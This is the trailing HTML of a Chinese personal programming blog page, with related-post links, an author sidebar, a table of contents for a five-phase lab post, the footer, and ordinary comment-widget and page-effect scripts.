2023-03-11</div><div class="title">计算机基础面试题总结</div></div></a></div><div><a href="/2023/03/07/C++面试题总结/" title="C++面试题总结"><img class="cover" src="/2023/03/07/C++%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/cpp.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-07</div><div class="title">C++面试题总结</div></div></a></div><div><a href="/2024/08/13/MIT6.s081-2021-Lab Copy on-write/" title="MIT6.s081 2021 Lab Copy on-write"><img class="cover" src="/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/unix.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-13</div><div class="title">MIT6.s081 2021 Lab Copy on-write</div></div></a></div><div><a href="/2024/08/13/MIT6.s081-2021-Lab Multithreading/" title="MIT6.s081 2021 Lab Multithreading"><img class="cover" src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/unix.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-13</div><div class="title">MIT6.s081 2021 Lab Multithreading</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/huaji0.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Chaoqun Zheng</div><div class="author-info__description">Write the code, change the world</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LordaeronESZ"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:1667510710@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_37409526" target="_blank" title="CSDN"><i class="fab fa-cuttlefish"></i></a><a class="social-icon" href="https://space.bilibili.com/34507428" target="_blank" title="Bilibili"><i class="fas fa-bold"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phase-1"><span class="toc-number">1.</span> <span class="toc-text">phase_1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phase-2"><span class="toc-number">2.</span> <span class="toc-text">phase_2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phase-3"><span class="toc-number">3.</span> <span class="toc-text">phase_3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phase-4"><span class="toc-number">4.</span> <span class="toc-text">phase_4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phase-5"><span class="toc-number">5.</span> <span class="toc-text">phase_5</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/25/CSAPP-Attack-Lab/" title="CSAPP Attack Lab"><img src="/2024/09/25/CSAPP-Attack-Lab/csapp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSAPP Attack Lab"/></a><div class="content"><a class="title" href="/2024/09/25/CSAPP-Attack-Lab/" title="CSAPP Attack Lab">CSAPP Attack Lab</a><time datetime="2024-09-25T03:45:11.000Z" title="发表于 2024-09-25 11:45:11">2024-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/17/CSAPP-Bomb-Lab/" title="CSAPP Bomb Lab"><img src="/2024/09/17/CSAPP-Bomb-Lab/csapp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSAPP Bomb Lab"/></a><div class="content"><a class="title" href="/2024/09/17/CSAPP-Bomb-Lab/" title="CSAPP Bomb Lab">CSAPP Bomb Lab</a><time datetime="2024-09-17T03:45:11.000Z" title="发表于 2024-09-17 11:45:11">2024-09-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/31/CSAPP-Data-Lab/" title="CSAPP Data Lab"><img src="/2024/08/31/CSAPP-Data-Lab/csapp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSAPP Data Lab"/></a><div class="content"><a class="title" href="/2024/08/31/CSAPP-Data-Lab/" title="CSAPP Data Lab">CSAPP Data Lab</a><time datetime="2024-08-31T03:45:11.000Z" title="发表于 2024-08-31 11:45:11">2024-08-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/16/MIT6.s081-2021-Lab%20File%20system/" title="MIT6.s081 2021 Lab File system"><img src="/2024/08/16/MIT6.s081-2021-Lab%20File%20system/unix.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MIT6.s081 2021 Lab File system"/></a><div class="content"><a class="title" href="/2024/08/16/MIT6.s081-2021-Lab%20File%20system/" title="MIT6.s081 2021 Lab File system">MIT6.s081 2021 Lab File system</a><time datetime="2024-08-16T03:45:11.000Z" title="发表于 2024-08-16 11:45:11">2024-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/" title="MIT6.s081 2021 Lab Multithreading"><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/unix.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MIT6.s081 2021 Lab Multithreading"/></a><div class="content"><a class="title" href="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/" title="MIT6.s081 2021 Lab Multithreading">MIT6.s081 2021 Lab Multithreading</a><time datetime="2024-08-13T10:03:11.000Z" title="发表于 2024-08-13 18:03:11">2024-08-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By Chaoqun Zheng</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"><img class="icp-icon" src="/img/beian_icon.png"><span>赣 ICP 备 2021004196 号 - 1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo-sooty-mu.vercel.app/',
+      region: ''
+    }, null))
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-sooty-mu.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
